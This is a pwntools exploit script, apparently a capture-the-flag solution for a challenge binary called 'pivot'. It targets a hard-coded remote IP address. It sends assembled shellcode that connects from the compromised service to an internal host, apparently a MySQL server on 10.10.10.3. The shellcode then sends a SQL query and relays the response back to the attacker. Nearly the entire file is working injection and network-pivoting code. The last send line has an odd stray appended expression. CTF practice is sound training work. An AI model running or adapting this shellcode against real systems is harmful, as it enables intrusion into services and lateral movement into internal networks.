#!/usr/bin/python3

from pwn import *

exe = ELF("pivot", checksec=False)
# libc = ELF("0", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*main+209

                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    # p = remote("10.10.10.2", 9999)
    p = remote("34.126.117.161", 9999)
else:
    p = process(exe.path)

GDB()
# if args.REMOTE:
#     payload = asm(
#         """
#               push rdx
#               mov rsi, rsp
#               """
#     )
# else:
#     payload = asm(
#         """
#               push r8
#               mov rsi, rsp
              
#               """
#     )

cmd = "SELECT VERSION();"

payload = asm(f'''
              mov r10, rdx
              mov rax, 0x29
              mov rdi, 0x2
              mov rsi, 0x1
              mov rdx, 0
              syscall
              
              mov rdi, rax
              push 0
              movabs r8, 0x30a0a0aea0c0002
              push r8
              mov rsi, rsp
              mov rax, 0x2a
              mov rdx, 0x10
              syscall
              
              mov rax, 0x1
              lea rsi, [r10 + 0x200]
              mov rdi, 3
              mov rdx, {len(cmd)}
              syscall
            
              mov rax, 0x0
              mov rdi, 3
              mov rdx, 0x200
              syscall
              
              mov rax, 1
              mov rdi, 1
              mov rdx, 0x200
              syscall
              ''')
# GDB()
# input()
sa(b"flag\n", payload.ljust(0x200, b'\x00') + (cmd).encode()) + p64(len(cmd))

p.interactive()